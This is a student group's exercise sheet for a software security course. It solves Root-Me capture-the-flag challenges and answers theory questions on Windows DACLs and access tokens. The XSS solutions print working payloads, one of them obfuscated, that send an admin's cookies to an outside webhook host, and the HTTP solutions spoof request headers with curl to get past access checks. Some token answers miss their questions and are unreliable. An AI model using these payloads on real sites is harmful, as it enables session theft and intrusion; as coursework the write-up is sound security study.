---
title: Exercise Sheet 01
tags:
  - Software-Security
  - Semester-5
  - Informatik
date: 2025-04-28
---
# Vulnerabilities and Access Control Implementation

> [!Example] Gruppe
> Mohammed Ali Al-Saiaf - 310320
> Nico Roth -
> Nokha Temarbulatov - 

## 1. Web Application Vulnerabilities (Without Time Constraints)

#### 1.2. Solve 2 of the challenges in the category Challenges => Web-Client that have a name starting with "XSS". \[Groups: 2 challenges per group member, e.g., 6 challenges for 3 persons\]

---
**Challenge 1:** [XSS - Stored - 1](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-1)
we submitted the payload:
```html
<script>new Image().src="https://webhook.site/[id]?c="+document.cookie</script>
```
in the message field.
Because the input wasn’t sanitized, the script was saved and later executed when the "admin" visited the page. The script sent the admin’s cookie to a URL we created on **webhook** site

---
**Challenge 2:** [XSS DOM Based - Introduction](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Introduction)
We first created a link that injected JavaScript into the `number` parameter: 
```http
http://challenge01.root-me.org/web-client/ch32/index.php?number=%27%3Bnew%20Image%28%29.src%3D%22https%3A%2F%2Fwebhook.site%2F8ed6a099-e13d-4c5c-8676-ba38b3e1c3b9%3Fc%3D%22%2Bdocument.cookie%3B%2F%2F
```
We sent this link through the contact form.  
Because the page put the `number` value directly into JavaScript without sanitizing it, my code ran when the admin clicked the link. It sent the admin’s cookie to **webhook** site

---
**Challenge 3:** [XSS DOM Based - AngularJS](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-AngularJS)
First we determine what we can inject by using the following payload:
```js
location.href='https://webhook.site/8ed6a099-e13d-4c5c-8676-ba38b3e1c3b9?c='+document.cookie
```
then convert it to character codes and use it in this payload:
```js
{{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(108,111,99,97,116,105,111,110,46,104,114,101,102,61,39,104,116,116,112,115,58,47,47,119,101,98,104,111,111,107,46,115,105,116,101,47,56,101,100,54,97,48,57,57,45,101,49,51,100,45,52,99,53,99,45,56,54,55,54,45,98,97,51,56,98,51,101,49,99,51,98,57,63,99,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101))()}}
```
and then appending it in the `name` parameter and sending it through contact gave the flag through the **webhook** site

---
**Challenge 4:** [XSS Stored - 2](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-2)
```
"><script>document.write(%22<img src=https://webhook.site/8ed6a099-e13d-4c5c-8676-ba38b3e1c3b9?%22.concat(document.cookie.replace(%22 %22,%22&%22)).concat(%22 />%22))</script>
```

#### 1.3. Solve 5 of the challenges in the category Challenges => Web-Server that have a name starting with "HTTP". \[Groups: All challenges starting with “HTTP”\]

**Challenge 1:** [HTTP - IP restriction bypass](https://www.root-me.org/en/Challenges/Web-Server/HTTP-IP-restriction-bypass)
We used the following command to access the page:
```powershell
curl -H "X-Forwarded-For: 10.0.0.1" http://challenge01.root-me.org/web-serveur/ch68/
```
and then got the output:
```html {9}
<!DOCTYPE html>
<html>
<head>
        <title>Secured Intranet</title>
</head>
<body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
                        <h1>Intranet</h1>
                <div>
                        Well done, the validation password is: <strong>Ip_$po0Fing
</strong>
                </div>
        </body>
</html>
```

---
**Challenge 2:** [HTTP - Open Redirect](https://www.root-me.org/en/Challenges/Web-Server/HTTP-Open-Redirect)
All we needed to do is to change the URL in the `url` parameter to a URL we control like google.com and set the h parameter to MD5 hash of the url:
```http
http://challenge01.root-me.org/web-serveur/ch52/?url=https://google.com&h=99999ebcfdb78df077ad2727fd00969f
```
and using the curl command we get the output:
```html
<p>Well done, the flag is e6f8a530811d5a479812d7b82fc1a5c5</p>
```

---
**Challenge 3:** [HTTP - User-Agent](https://www.root-me.org/en/Challenges/Web-Server/HTTP-User-Agent)
By running this command:
```powershell
curl -H "User-Agent: admin" http://challenge01.root-me.org/web-serveur/ch2/
```
we get:
```html
<html><body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe><h3>Welcome master!<br/>Password: rr$Li9%L34qd1AAe27
</h3></body></html>
```

---
**Challenge 4:** [HTTP - Directory indexing](https://www.root-me.org/en/Challenges/Web-Server/HTTP-Directory-indexing)
after opening the link:
```http
http://challenge01.root-me.org/web-serveur/ch4/admin
```
it opened a folder where eventuely we found a file called `flag.txt` and by opening it we got:
```txt
Password / Mot de passe : LINUX
```

---
**Challenge 5:** [HTTP - Headers](https://www.root-me.org/en/Challenges/Web-Server/HTTP-Headers)
After running the command:
```sh
curl -I "http://challenge01.root-me.org/web-serveur/ch5/"
```
we got the output:
```txt
HTTP/1.1 200 OK
Server: nginx
Date: Mon, 28 Apr 2025 10:35:49 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Vary: Accept-Encoding
Header-RootMe-Admin: none
```
The header Header-RootMe-Admin got my attention so i tried:
```sh
curl -H "Header-RootMe-Admin: admin" "http://challenge01.root-me.org/web-serveur/ch5/"
```
and then somehow got:
```html
<html>
<body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
<p>Content is not the only part of an HTTP response!</p>
<p>You dit it ! You can validate the challenge with the password HeadersMayBeUseful
</p></body>
</html>
```


---
## 2. Access Control Implementation: Access Control Lists
#### How are access control lists (DACL) evaluated in Microsoft Windows?
Windows checks DACLs by going through ACEs one by one, top to bottom. It applies the first matching deny or allow rule it finds. Denies are stronger if they come earlier. If nothing matches, access is denied.
#### 2.1.-2.2. How is the special case NULL DACL treated? How is the special case empty DACL treated?
according to [Microsoft](https://learn.microsoft.com/en-us/windows/win32/secauthz/null-dacls-and-empty-dacls), a NULL DACL means that everyone has full access to the object. This is like saying "no restrictions at all." So, if a DACL is NULL, the system treats it as if there are no access rules, and anyone can do anything with that object. A NULL DACL should not be confused with an empty DACL. An empty DACL means no one has access, while a NULL DACL means everyone has access.

#### 2.3. In what order are ACEs processed when an ACL is parsed for matching ACEs?
Windows processes the ACEs in the exact order they are stored in the DACL, from **top to bottom**. 
It checks each ACE one by one until it finds a match for the user or one of their groups.  
If a matching deny ACE is found first, access is denied immediately.
If a matching allow ACE is found, access can be granted but Windows might still check further ACEs if necessary.

#### 2.4. Because of the order in which ACEs are processed – in which order should you store allow ACEs and deny ACEs? Why?
Deny ACEs should be stored first, before any allow ACEs, because Windows checks the ACEs in order and if a deny is found first, it immediately blocks access.  
If you put allow ACEs first, someone might get access before the deny rule is even checked which would be unsafe.

#### 2.5. What system-wide privileges make a DACL ineffective as a protection mechanism and why?
Privileges like **SeTakeOwnershipPrivilege**, **SeBackupPrivilege**, **SeDebugPrivilege** and **SeRestorePrivilege** can make a DACL useless. These privileges allow a user to take ownership of an object, read it, or write to it, even if the DACL says no.
Basically, these privileges override normal access control rules.

---
## 3. Access Control Implementation: Tokens
#### 3.1. Name the security identifiers (SIDs) that are included in a token.
a Windows access token contains the following SIDs:
- **User SID** identifies the user
- **Group SIDs** identify all groups the user belongs to
- **Restricting SID list** SIDs that limit access (if a restricted token is used)
- **Logon session identifier** as a group SID

Additionally, the token includes:
- **Default DACL** to apply permissions when a new object is created
- **Privilege list** a list of special privileges the user has

#### 3.2. Group membership of a subject is checked at the time of token creation. Discuss this design decision both from a security and a runtime performance perspective.
When a process wants to access an object, Windows compares the SIDs in the token (user SID and group SIDs) with the SIDs listed in the object’s DACL.
The system checks if any SID from the token matches an ACE in the DACL:
- If a deny ACE matches first => access is immediately denied.
- If an allow ACE matches => access is granted for the requested permissions.
- If no match is found => access is denied by default.
The comparison is done at handle creation time, not at every access for better performance

#### 3.3. What is the purpose of restricted SIDs in a token?
When a process opens a file (or any object), Windows takes the SIDs in the process’s access token and compares them with the entries in the object’s DACL. 
If it finds a matching **deny** entry first, access is refused and if it finds a matching **allow** entry the requested rights are granted. 
If nothing matches, access is denied. This check is done once so Windows doesn’t repeat it for every read or write.

#### 3.4. Give an example when you should use a restricted token for a child process/thread.
For example the “Open with Notepad” button you sometimes see in a setup tool. 
The installer itself runs with full admin rights so it can write to `C:\Program Files`.  
When the user opens it with notepad to read the licence text, the installer should not pass those admin rights on to Notepad, otherwise the tiny text viewer could delete system files if it were tricked or hijacked.  
Instead, the installer creates a **restricted token** that removes its powerful privileges and starts Notepad with that limited token.  
Now Notepad can read the licence file, but it can’t touch anything outside the installer’s temp folder, keeping the system safe even if Notepad is exploited.